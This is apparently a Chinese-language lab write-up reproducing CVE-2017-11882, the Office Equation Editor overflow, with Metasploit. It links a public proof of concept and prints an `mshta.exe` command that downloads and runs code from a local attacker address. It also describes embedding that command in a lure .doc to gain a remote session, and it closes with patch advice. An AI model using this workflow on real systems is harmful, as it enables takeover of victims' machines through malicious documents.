# MS office_RCE



## 漏洞描述

CVE-2017-11882 漏洞位于 Office 的 EQNEDT32.EXE 组件中，该组件是一款用于创建和编辑数学方程式的组件，由于在拷贝 Office 传入 font name 字段时没有对该字符串的长度进行限制，所以造成了缓冲区的溢出。这个漏洞允许攻击者通过特制的恶意文档利用漏洞，执行任意的代码。

攻击者可以通过电子邮件附件、恶意网站或其他方式传播包含恶意代码的文档，一旦用户打开这些文档，恶意代码就可能被执行，导致攻击者获取系统控制权、窃取敏感信息或进行其他恶意活动。





## 影响版本

![img](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/20190710220035981.png)





## 漏洞复现

> **poc下载**
>
> 下载地址：`https://github.com/starnightcyber/CVE-2017-11882`

![image-20240409184543052](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409184543052.png)

![image-20240409175014707](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409175014707.png)

可以看到，我已经将该项目下载到本地；

将 其中的 PS_shell.rb 文件放到MSF的安装目录的 exploits 模块下，改个易懂的名。

![image-20240409175214785](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409175214785.png)

然后启动MSF，并进入这个模块![image-20240409175559222](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409175559222.png)

在这里设置参数，端口 和url的路径

![image-20240409182851686](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409182851686.png)

执行run

![image-20240409182920038](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409182920038.png)

可以看到，生成了`mshta.exe "http://192.168.1.9/intsall"`这样一段话。其中意义是通过` http://192.168.1.9/intsall`这个url下载文件,然后使用`mshta.exe`来执行； 

回到poc的下载目录，执行脚本，将上面run命令执行后生成的命令和 武功秘籍.doc 文件进行绑定

![image-20240409183049492](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409183049492.png)

可以看到，攻击机在监听，等待目标机点击文档

![image-20240409183929873](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409183929873.png)

![image-20240409184006311](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409184006311.png)

可以看到，目标机点击文件后，攻击者就有流量反应了

使用session -i查看上线的机器

![image-20240409184201197](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409184201197.png)

指定编号进行连接

![image-20240409184255150](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240409184255150.png)

可以看到，成功拿下目标机；



## 修复建议

- 下载微软安全更新中心关于 CVE-2017-11882 的补丁
- 升级office到最新版





